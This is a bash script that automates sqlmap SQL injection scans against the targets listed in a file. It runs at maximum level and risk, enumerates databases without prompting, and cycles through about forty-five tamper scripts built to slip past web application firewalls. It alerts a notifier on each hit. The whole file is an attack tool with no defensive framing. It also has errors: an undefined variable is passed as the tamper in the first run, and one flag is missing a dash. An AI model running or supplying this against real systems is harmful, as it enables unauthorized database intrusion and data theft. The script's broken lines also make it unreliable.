#!/usr/bin/env bash
echo -e "Start check without tampers... \n"

sqlmap -m sqli.txt --threads=10 --level 5 --risk 3 --dbs --batch --tamper "$i" --random-agent --skip-static --smart --alert="./sqli2notify.sh $$"

echo -e "Start with tampers... \n"

declare -a arr=(
"apostrophemask.py"
"apostrophenullencode.py"
"appendnullbyte.py"
"base64encode.py"
"between.py"
"bluecoat.py"
"chardoubleencode.py"
"commalesslimit.py"
"commalessmid.py"
"concat2concatws.py"
"charencode.py"
"charunicodeencode.py"
"charunicodeescape.py"
"equaltolike.py"
"escapequotes.py"
"greatest.py"
"halfversionedmorekeywords.py"
"ifnull2ifisnull.py"
"modsecurityversioned.py"
"modsecurityzeroversioned.py"
"multiplespaces.py"
"nonrecursivereplacement.py"
"percentage.py"
"overlongutf8.py"
"randomcase.py"
"randomcomments.py"
"securesphere.py"
"sp_password.py"
"space2comment.py"
"space2dash.py"
"space2hash.py"
"space2morehash.py"
"space2mssqlblank.py"
"space2mssqlhash.py"
"space2mysqlblank.py"
"space2mysqldash.py"
"space2plus.py"
"space2randomblank.py"
"symboliclogical.py"
"unionalltounion.py"
"unmagicquotes.py"
"varnish.py"
"versionedkeywords.py"
"versionedmorekeywords.py"
"xforwardedfor.py"
)
for i in "${arr[@]}"
do
    echo -e "Start check with $i tamper... \n"
    sqlmap -m sqli.txt --threads=10 --level 5 --risk 3 --dbs --batch --tamper "$i" -random-agent --skip-static --alert="./sqli2notify.sh $$"
    echo -e "Completed... \n"
done